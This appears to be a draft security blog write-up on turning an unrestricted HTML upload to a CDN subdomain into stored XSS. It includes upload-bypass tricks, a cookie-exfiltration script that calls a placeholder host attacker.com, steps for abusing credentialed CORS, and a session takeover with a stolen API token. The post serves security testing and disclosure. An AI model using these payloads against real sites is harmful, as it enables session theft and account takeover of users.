+++
date = '2026-05-25T18:03:42+02:00'
draft = true
title = 'File upload to XSS'
+++

# Validating and exploiting CDN subdomain XSS
How can unrestricted file upload to CDN lead to XSS vulenerability with impact?
\
\
Requirements:
- Endpoint that allows the user to upload and access HTML file.
- SameSite cookie flag is set as **Lax** or **None**.
- CDN is a trusted origin for requests to target subdomains.
- Bonus - important cookies are not **HttpOnly**.


## Uploading HTML file

Capture the file upload request in your proxy, and modify it's content with benign html.

```http
POST /upload/ HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxx

------WebKitFormBoundaryxxx
Content-Disposition: form-data; name="upload"; filename="test.html"
Content-Type: text/html

<u>testing html</u>
------WebKitFormBoundaryxxx--
```

This is an ideal scenario, if the server does not accepts this try tampering with the
form **content type** or **filename extension**.
Common bypasses are using %00 **null byte** or semicolon, newline, CRLF...

## Testing Javascript limits
If the HTML is rendered properly and accessible by other authenticated users.\
We can then test a simple Javascript payload for proof of concept.

You should also montitor the browser dev-tools console for errors.

```html
<script>fetch('https://target.com/api/user/current/')</script>
```

If you haven't been stopped by a **WAF** or **CORS** error by now that's a great sign.
Ideally for maximum impact grabbing the cookies would be the best.

\
But more often than not, the session cookie will be HttpOnly, meaning we can't steal it.

There is a decent chance other cookies are up for grabs, possibly for API interraction or other sensitive mechanisms.
Those other cookies could lead to a full session compromise.

### Cookie stealing
```html
<script>fetch('https://attacker.com/?x='+btoa(document.cookie))</script>
```

This script will make an HTTP request to the attacker controlled server and the cookies will be transported as a base64 string in the URL parameter.

\
Just be aware, if you attempt this method for cookie exfiltration.
You are likely to get a CORS error in the browser console, but worry not.
\
CORS did not prevent the request from reaching our server, it simply prevented reading the response.

### Abusing include credentials and CORS

If we cannot steal the session cookie directly, it's time to get creative and get the most impact by taking advantage of include credentials and CORS.

- Find a target endpoint that has sensitive functionality or user data.
- Capture a regular usage request in the proxy.
- Change the **Origin: https://target.com** header into with **https://cdn.target.com**
- Send the modified request.

\
The server response headers will tell you if CORS will allow you to read the HTTP responses, and if cookies will be included in your XSS requests.
```http
# server response
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://cdn.target.com
access-control-allow-credentials: true
```

To be able to read sensitive data, this will be sufficient.

But to able to write and modify, CSRF might give you some trouble.

It really depends on what origins are allowed, similar to CORS.

And how the CSRF tokens are implemented and possibly capchas.

Topic for another day...

\
To wrap it up, if CORS allows you to use the include credentials it really depends on case by case basis on how to escalate this into a impactful bug.

## Session takeover via API token
In my case, what ended up happening is I eventually managed to achieve full session takeover with API cookie, but not in a way I would expect it to happen.

\
I've attempted to figure out a way to achieve takeover via reset password and email endpoints and whatnot...

All failed, because of the prerequired knowledge for that user.
Until I attempted to open the target website in browser, clear my session and **only** input the stolen API token.

\
The webapp loaded up and my cookies got auto-filled from the server that correspond to that API token cookie, I assume because it's a trusted secret.

I was shocked to say the least lol.

\
It ended up being one of sorta unrelated endpoints completing my session, no other, so it's worth repeating the mantra *HTTP is a stateless protocol*.

So in otherwords, one request in isolation does not tell the whole story.

\
One more takeaway tidbit from this experience was that applications have a tendency to prioritize handling edge cases to just work at the cost of security.
